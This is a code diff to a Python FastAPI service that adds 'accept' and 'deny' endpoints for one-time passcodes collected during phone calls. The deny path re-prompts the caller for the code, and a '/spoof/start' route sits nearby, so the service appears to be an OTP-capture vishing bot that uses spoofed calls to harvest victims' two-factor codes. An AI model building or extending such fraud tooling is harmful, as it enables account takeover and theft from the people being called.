@@ -248,6 +248,93 @@ async def hangup_call(call_id: str, current_user: dict = Depends(verify_token)):
         raise
     except Exception as e:
         logger.error(f"Error hanging up call: {e}")
+        raise HTTPException(status_code=500, detail="Failed to hangup call")
+
+@router.post("/{call_id}/accept")
+async def accept_otp(call_id: str, current_user: dict = Depends(verify_token)):
+    """Accept OTP - Play accepted message and end call"""
+    try:
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
+        
+        if not call_data:
+            raise HTTPException(status_code=404, detail="Call not found")
+        
+        # Security: Check if user owns this call or is admin
+        if current_user['role'] != 'admin' and call_data.get('user_id') != current_user['uid']:
+            raise HTTPException(status_code=403, detail="Access denied")
+        
+        # Set admin decision to accept
+        await MongoDBService.update_call_field(call_id, 'admin_decision', 'accept')
+        await MongoDBService.update_call_status(call_id, 'otp_accepted')
+        
+        # Create event
+        event = {
+            'time': datetime.utcnow().isoformat(),
+            'event': 'otp_accepted',
+            'message': '✅ OTP Accepted by admin',
+            'data': {'decision': 'accept'}
+        }
+        
+        await MongoDBService.update_call_events(call_id, event)
+        await manager.send_to_user(call_data['user_id'], {
+            'type': 'call_event',
+            'call_id': call_id,
+            'event': event
+        })
+        
+        logger.info(f"OTP accepted for call {call_id} by user {current_user['uid']}")
+        
+        return {"message": "OTP accepted successfully", "call_id": call_id}
+    
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Error accepting OTP: {e}")
+        raise HTTPException(status_code=500, detail="Failed to accept OTP")
+
+@router.post("/{call_id}/deny")
+async def deny_otp(call_id: str, current_user: dict = Depends(verify_token)):
+    """Deny OTP - Play rejected message and ask for code again"""
+    try:
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
+        
+        if not call_data:
+            raise HTTPException(status_code=404, detail="Call not found")
+        
+        # Security: Check if user owns this call or is admin
+        if current_user['role'] != 'admin' and call_data.get('user_id') != current_user['uid']:
+            raise HTTPException(status_code=403, detail="Access denied")
+        
+        # Set admin decision to deny
+        await MongoDBService.update_call_field(call_id, 'admin_decision', 'deny')
+        await MongoDBService.update_call_status(call_id, 'otp_denied')
+        
+        # Create event
+        event = {
+            'time': datetime.utcnow().isoformat(),
+            'event': 'otp_denied',
+            'message': '❌ OTP Denied by admin',
+            'data': {'decision': 'deny'}
+        }
+        
+        await MongoDBService.update_call_events(call_id, event)
+        await manager.send_to_user(call_data['user_id'], {
+            'type': 'call_event',
+            'call_id': call_id,
+            'event': event
+        })
+        
+        logger.info(f"OTP denied for call {call_id} by user {current_user['uid']}")
+        
+        return {"message": "OTP denied successfully", "call_id": call_id}
+    
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Error denying OTP: {e}")
+        raise HTTPException(status_code=500, detail="Failed to deny OTP")
 
 
 @router.post("/spoof/start")
